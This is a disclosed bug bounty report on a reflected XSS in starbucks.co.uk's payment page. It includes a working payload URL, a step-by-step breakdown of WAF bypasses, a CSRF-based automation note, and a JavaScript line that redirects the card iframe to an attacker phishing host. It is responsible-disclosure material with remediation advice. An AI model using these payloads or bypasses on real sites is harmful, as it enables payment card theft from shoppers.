# XSS on https://www.starbucks.co.uk (can lead to credit card theft) (/shop/paymentmethod)

## Report Details
- **Report ID**: 227486
- **URL**: https://hackerone.com/reports/227486
- **State**: Closed
- **Severity**: high
- **Submitted**: 2017-05-10T13:28:32.386Z
- **Disclosed**: 2018-05-22T21:50:20.339Z

## Reporter
- **Username**: bayotop
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: starbucks

## Vulnerability Information
Hi,

**Steps to reproduce:**

0. Run Firefox (these steps *require* Firefox).
1. Log in on https://www.starbucks.co.uk/account/signin
2. Go to https://www.starbucks.co.uk/shop/card/egift and add any card to your basket.
3. Go to https://www.starbucks.co.uk/shop/paymentmethod?==%u0022a%20onclick=confirm(/-/g+this.ownerDocument.domain)%20id=%u0022checkoutButton
4. After the page finishes loading click the "Checkout" title.
5. A confirmation prompt is shown showing the current domain.

**Note** that these steps can be automated due to missing CSRF protection on the "Add to Basket" option. Effectively, all a user has to do is to load a page which is under attacker's control. I set up an example: http://bayo.rocks/f42e32a3-9e9a-4be0-8cfb-4b5d766b97d0/sbux_poc.html (this link is private).

**Description:**

I'll explain what is going on and why this works. First, take a look at https://www.starbucks.co.uk/shop/card/egift?reflected 
Looking at the source code you see the whole URL is reflected in a link tag. 

```html
<link rel="canonical" href="https://www.starbucks.co.uk/shop/card/egift?reflected" />
```
Trying to inject malicious code seems to be blocked by a WAF. However, all checks can be eventually bypassed to inject arbitrary attributes, e.g. https://www.starbucks.co.uk/shop/card/egift?%u0022%20id=%u0022injected results in: 

```html
<link rel="canonical" href="https://www.starbucks.co.uk/shop/card/egift?" id="injected" />
```

This works on every page (!) site-wide. However, I am not aware of any technique to get arbitrary JS execution at this point. However, there is a handy [script](https://www.starbucks.co.uk/static/resource/shop_js/676938998_en-GB) loaded into the page that does the following:

```javascript
$("#checkout").bind("click", function(e) {
    $("#checkoutButton").trigger("click")
});
```

You see where this is going. In case I find a page that has an element with the id **checkout**, I can inject **id="checkoutButton" onclick="malicous_js"** to the above link element and the injected JS will be executed once the **checkout** element is clicked. 

Exactly such a page is https://www.starbucks.co.uk/shop/paymentmethod (requires authentication). You can see the credit card form being loaded on this page. Luckily, it is loaded from a different origin so the form data can't be read using the injected JS. However, a determined attacker can easily set up a exact-looking page and change the iframe's content to steal the victim's credit card information:

```javascript
document.getElementById('payment-method-iframe').contentWindow.location.href = 'https://sbuxphishingsiteunderattackerscontrol.com';
```

**Note** that the **checkout** element is actually **<body>** so there is plenty of space where the user can click to execute the malicious JS.

Take into consideration that his could work in both IE and Chrome and the only thing preventing the PoC are the browsers' built in XSS protections. I am working on a bypass, but unfortunately I am not quite there, yet.

To sum up, I'll breakdown the injection from the PoC (==%u0022a%20onclick=confirm(/-/g+this.ownerDocument.domain)%20id=%u0022checkoutButton):

1. **==** -> used to trick the [query string parsing code](https://www.starbucks.co.uk/static/resource/shop_js/676938998_en-GB) that is calling decodeURIcomponent(). Otherwise decodeURIcomponent("%u0022") throws an exception resulting in the "checkout bind" never being called.
2. **%u0022** -> bypasses the WAF that is causing a 404 when the query contains "%22".
3. **a%20onclick=** -> allows to inject any on*= handlers. Otherwise a server error is returned when a blacklisted onhandler is followed by an equals sign in the query.
4. **confirm(/-/g** -> the WAF seems to dislike confirm(), alert() and so on. Adding a '/' after the left bracket makes him happy again.
5. **+this.ownerDocument.domain)** -> the WAF doesn't like "document".

**Impact**

As mentioned, an attacker can easily trick users into disclosing their credit data. The victims might not even realize that they were tricked and their privacy was compromised. All they know is they entered their data on "https://starbucks.co.uk" as usual. Note that other "typical" possible ways to compromise the victims using XSS (BeEF hooks etc.) are, of course, still applicable.

**Recommendation**

Correctly encode user input before rendering it back into the page. You shouldn't rely only on your WAF / custom blacklisting to protect you. Consider auditing yout site and adding CSRF protection to actions like "Add to Basket". You might also consider fixing the bypasses I mentioned. 

## Attachments
No attachments
